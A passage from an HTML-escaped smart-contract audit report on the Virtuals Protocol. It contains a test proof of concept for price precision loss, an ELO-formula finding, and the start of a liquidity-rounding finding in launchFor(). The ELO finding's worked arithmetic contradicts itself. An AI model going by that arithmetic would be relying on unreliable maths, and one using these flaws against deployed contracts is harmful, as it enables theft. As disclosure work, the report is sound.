class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const { fPair, router } = await loadFixture(deployFPairFixture);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Scenario 1: reserve1 = 199 * 10^18, reserve0 = 100 * 10^18\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Expected price: 1.99, but due to integer division, it will be 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const reserve0 = parseEther(\u0026quot;100\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const reserve1 = parseEther(\u0026quot;199\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Since only router can call mint, we need to impersonate it\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await fPair.connect(router).mint(reserve0, reserve1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Check reserves were set correctly\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const [actualReserve0, actualReserve1] = await fPair.getReserves();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      expect(actualReserve0).to.equal(reserve0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      expect(actualReserve1).to.equal(reserve1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Check price calculation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const priceA = await fPair.priceALast();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      console.log(\u0026quot;Actual price should be 1.99, but priceALast() returns:\u0026quot;, priceA.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Verify the precision loss - price should be 1 instead of 1.99\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      expect(priceA).to.equal(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      // Calculate the actual price with higher precision (using JavaScript)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      const actualPrice = Number(formatEther(reserve1)) / Number(formatEther(reserve0));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      console.log(\u0026quot;Actual price calculated with JavaScript:\u0026quot;, actualPrice);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      console.log(\u0026quot;Precision loss:\u0026quot;, actualPrice - Number(priceA));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-25-incorrect-mathematical-logic\" style=\"position:relative;\"\u003e\u003ca href=\"#m-25-incorrect-mathematical-logic\" aria-label=\"m 25 incorrect mathematical logic permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-233\"\u003e[M-25] Incorrect mathematical logic\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-342\"\u003edjshan_eden\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-258\"\u003eMatin\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-706\"\u003eNexarion\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L56\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L56\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L59\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L59\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L60\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/libs/Elo.sol#L60\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-10\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-10\" aria-label=\"finding description 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThere is a fundamental error in the ELO calculation formula. For example, when \u003ccode\u003eratingA=1000\u003c/code\u003e and \u003ccode\u003eratingB=800\u003c/code\u003e, the code calculation result deviates greatly from the standard formula. The core problem lies in the exponent processing:\u003c/p\u003e\n\u003cp\u003eThe correct calculation should be \u003ccode\u003e10^(ratingDiff/400)\u003c/code\u003e, but the code incorrectly converts the exponent through \u003ccode\u003en = 800 ± ratingDiff\u003c/code\u003e and the fourth square root, resulting in an incorrect powered value.\u003c/p\u003e\n\u003ch3 id=\"impact-17\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-17\" aria-label=\"impact 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eAll ELO rating changes are calculated incorrectly, the rating system is completely untrustworthy, and attackers can use this vulnerability to obtain abnormally high rating changes.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eRemove offset:\u003c/strong\u003e Handle the positive and negative rating differences directly.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccurate exponential calculation:\u003c/strong\u003e Use a high-precision library (such as ABDKMath) to calculate \u003ccode\u003e10^(ratingDiff/400)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAvoid decomposition errors:\u003c/strong\u003e Abandon multi-step square root decomposition and handle the raw exponential directly.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"proof-of-concept-18\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e1. Differences between the original formula and the code implementation​:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eCorrect formula - the expected ELO score is:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"121\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eratingDiff = _negative ? ratingA - ratingB : ratingB - ratingA\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eexpected score = 1 / (1 + 10 ^ (ratingDiff / 400))\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCode error steps - the contract attempts to optimize the calculation by factoring the exponent, but introduces a fatal error:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"122\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003en = _negative ? 800 - ratingDiff: 800 + ratingDiff;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e_powered = fp.rpow(10, n / 25, 1); // calculate10^(n/25)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epowered = sixteenthRoot(_powered); // The fourth square root → is equivalent to10^(n/(25 * 16)) = 10^(n/400)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOn the surface, the math is equivalent to \u003ccode\u003e10^(ratingDiff/400)\u003c/code\u003e, but the ​​offset of 800​​ completely breaks the logic.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2. Sign error caused by offset\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eExample analysis - Assume that \u003ccode\u003eRA=1000\u003c/code\u003e, \u003ccode\u003eRB=800\u003c/code\u003e, then:\u003c/p\u003e\n\u003cp\u003eCorrect case -  The exponent is \u003ccode\u003e(1000−800)/400=0.5\u003c/code\u003e, and the denominator is \u003ccode\u003e1+10^0.5≈4.1623\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eCode calculation​​:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"123\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eratingDiff = 200, _negative = true\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003en = 800 - 200 = 600\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003en/25 = 24 → 10 ^24\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFourth square root → 10 ^(24/16)=10^1.5≈31.623\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eThe denominator becomes 100+31.623=131.623, which is much smaller than the correct value 4.1623. \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eResults:\u003c/strong\u003e expected score was incorrectly inflated, causing a complete distortion in the ELO change calculation.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e3. Summary of the root causes of the error\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eWrong offset:\u003c/strong\u003e The introduction of \u003ccode\u003e800 ± ratingDiff\u003c/code\u003e has no mathematical basis, resulting in double errors in the exponent sign and magnitude.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDecomposition steps are incompatible with integer operations:\u003c/strong\u003e the correct decomposition should be \u003ccode\u003e10^ratingDiff/400 = (10^ratingDiff/25)^1/16\u003c/code\u003e. But after \u003ccode\u003en\u003c/code\u003e was incorrectly offset in the code, the actual calculation of \u003ccode\u003e10^(800±ratingDiff)/(25×16)\u003c/code\u003e is equivalent to \u003ccode\u003e10^(800±ratingDiff)/400\u003c/code\u003e, which is completely deviated from the original formula.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSign processing is reversed:\u003c/strong\u003e when \u003ccode\u003eRA\u003eRB\u003c/code\u003e, the exponent should be positive, but the offset in the code makes it become \u003ccode\u003e(800−ratingDiff)/400\u003c/code\u003e, resulting in the reverse calculation of the denominator.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router\" style=\"position:relative;\"\u003e\u003ca href=\"#m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router\" aria-label=\"m 26 imprecise calculations in launchfor lead to less liquidity be added to the pair via the router permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-278\"\u003e[M-26] Imprecise calculations in \u003ccode\u003elaunchFor()\u003c/code\u003e lead to less liquidity be added to the pair via the router\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-817\"\u003eMatin\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-760\"\u003ecodexNature\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L215-L216\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L215-L216\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-9\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-9\" aria-label=\"finding description and impact 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eSolidity rounds down the result of an integer division, and because of that, it is always recommended to multiply before dividing to avoid that precision loss. The problem arises in the Bonding.sol’s \u003ccode\u003elaunchFor()\u003c/code\u003e function where the \u003ccode\u003eliquidity\u003c/code\u003e is calculated:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunchFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_name\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_ticker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edesc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurls\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epurchaseAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecreator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// code\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan 